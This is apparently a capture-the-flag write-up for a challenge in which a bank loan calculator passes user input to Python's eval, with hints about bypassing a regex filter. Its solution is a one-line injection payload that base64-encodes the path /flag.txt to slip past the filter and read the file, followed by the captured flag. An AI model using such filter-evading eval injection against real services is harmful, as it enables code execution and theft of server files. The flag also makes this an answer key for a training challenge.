## Descripción 
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an `eval` function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

Additional details will be available after launching your challenge instance.
## Hints
1. Bypass regex
2. The flag file is `/flag.txt`
3. You might need encoding or dynamic construction to bypass restrictions.
## Solución
```
open(__import__('base64').b64decode('L2ZsYWcudHh0').decode()).read()

Result: picoCTF{D0nt_Use_Unsecure_f@nctionsba15f0f7}

```
## Notas

## Referencias
